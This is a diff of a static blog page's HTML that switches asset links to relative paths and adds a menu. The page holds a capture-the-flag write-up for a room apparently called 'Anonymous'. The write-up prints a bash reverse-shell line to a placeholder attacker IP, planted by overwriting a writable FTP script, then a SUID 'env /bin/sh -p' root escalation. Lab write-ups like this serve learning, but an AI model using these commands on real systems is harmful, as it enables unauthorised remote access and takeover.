@@ -102,15 +102,15 @@ i entered the ftp server and enumerate it ( i logged in with anonymous credentia
     
 
     <link rel="canonical" href="https://novaclearnscyber.github.io/blog/posts/anonymous/">
-    <link href="https://novaclearnscyber.github.io/blog/style.min.e390ba7da26222f4dc42a349955d76dbbe44e5ce2535a43de5a70633a0a9ec3c.css" rel="stylesheet">
-    <link href="https://novaclearnscyber.github.io/blog/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+    <link href="/blog/style.min.e390ba7da26222f4dc42a349955d76dbbe44e5ce2535a43de5a70633a0a9ec3c.css" rel="stylesheet">
+    <link href="/blog/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
 
     
-    <link rel="apple-touch-icon" sizes="180x180" href="https://novaclearnscyber.github.io/blog/icons/apple-touch-icon.png">
-    <link rel="icon" type="image/png" sizes="32x32" href="https://novaclearnscyber.github.io/blog/icons/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="https://novaclearnscyber.github.io/blog/icons/favicon-16x16.png">
-    <link rel="mask-icon" href="https://novaclearnscyber.github.io/blog/icons/safari-pinned-tab.svg">
-    <link rel="shortcut icon" href="https://novaclearnscyber.github.io/blog/favicon.ico">
+    <link rel="apple-touch-icon" sizes="180x180" href="/blog/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/blog/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/blog/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/blog/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/blog/favicon.ico">
 
 
 
@@ -123,14 +123,14 @@ i entered the ftp server and enumerate it ( i logged in with anonymous credentia
     <meta name="color-scheme" content="light dark">
 
     
-    <link rel="icon" type="image/svg+xml" href="https://novaclearnscyber.github.io/blog/icons/favicon.svg">
+    <link rel="icon" type="image/svg+xml" href="/blog/icons/favicon.svg">
 
     
     
     
       
-<link rel="icon" type="image/png" href="https://novaclearnscyber.github.io/blog/favicon.png">
-<link rel="shortcut icon" href="https://novaclearnscyber.github.io/blog/favicon.png">
+<link rel="icon" type="image/png" href="/favicon.png">
+<link rel="shortcut icon" href="/favicon.png">
     
 </head>
 
@@ -148,6 +148,16 @@ stroke-linejoin="round" class="feather feather-home">
 </svg>
         </a>
     </div>
+    
+    <ul class="menu">
+        
+        <li>
+            <a href="/blog/categories/">
+                Categories
+            </a>
+        </li>
+        
+    </ul>
     
 </nav>
 
@@ -200,36 +210,36 @@ stroke-linejoin="round" class="feather feather-home">
             
             <div class="page-content">
                 <p>To answer the first two questions just basic nmap scan<br>
-<img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260225133840.png" alt=""></p>
+<img src="/images/blog-ul-meu/static/Pasted%20image%2020260225133840.png" alt=""></p>
 <p>then lets enumerate the SMB service<br>
 note: smb ( server message block) is a communication protocol used to share files , printers , serial ports and miscellaneous commmunication<br>
-<img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260225134257.png" alt=""><br>
+<img src="/images/blog-ul-meu/static/Pasted%20image%2020260225134257.png" alt=""><br>
 ok interesting lets verify that smb files<br>
-<img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260225134958.png" alt=""><br>
+<img src="/images/blog-ul-meu/static/Pasted%20image%2020260225134958.png" alt=""><br>
 i dowloaded those two files and check them but nothing to interesting<br>
 lets check ftp now</p>
-<p><img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260225135546.png" alt=""><br>
+<p><img src="/images/blog-ul-meu/static/Pasted%20image%2020260225135546.png" alt=""><br>
 i entered the ftp server and enumerate it ( i logged in with anonymous credentials , that means nothing , ok cool ) , then i found a scripts folder and get it contents</p>
 <p>looking inside those files only the clean.sh seems interesting<br>
-<img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260225140022.png" alt=""><br>
+<img src="/images/blog-ul-meu/static/Pasted%20image%2020260225140022.png" alt=""><br>
 yeah nothing really cool , but lets rewind a lil bit<br>
 looking back at the permisions of the files we downloaded we see that<br>
-<img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260225140336.png" alt=""><br>
+<img src="/images/blog-ul-meu/static/Pasted%20image%2020260225140336.png" alt=""><br>
 clean.sh has some crazy permmissions on , so lets try to create our one clean.sh and overwrite this</p>
 <p>ok so what i did i replace clean.sh content with :</p>
 <pre tabindex="0"><code>#!/bin/bash 
 bash -i &gt;&amp; /dev/tcp/YOUR_IP/YOUR_PORT 0&gt;&amp;1
 </code></pre><p>then i put the file on the system<br>
-<img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260225140827.png" alt=""><br>
+<img src="/images/blog-ul-meu/static/Pasted%20image%2020260225140827.png" alt=""><br>
 and in just a few seconds i got a reverse shell<br>
-<img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260225140932.png" alt=""><br>
+<img src="/images/blog-ul-meu/static/Pasted%20image%2020260225140932.png" alt=""><br>
 boom , and we got user.txt and pics folder other two answers</p>
 <p>i enumerated some suid with</p>
 <pre tabindex="0"><code>find / -perm -u=s -type f 2&gt;/dev/null
 </code></pre><p>and luckely i founded good old env<br>
-<img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260225144302.png" alt=""><br>
+<img src="/images/blog-ul-meu/static/Pasted%20image%2020260225144302.png" alt=""><br>
 cool lets use that<br>
-<img src="https://novaclearnscyber.github.io/blog/images/blog-ul-meu/static/Pasted%20image%2020260225144413.png" alt=""><br>
+<img src="/images/blog-ul-meu/static/Pasted%20image%2020260225144413.png" alt=""><br>
 and bam with</p>
 <pre tabindex="0"><code>env /bin/sh -p
 </code></pre><p>we are root now , ez , very cool room</p>
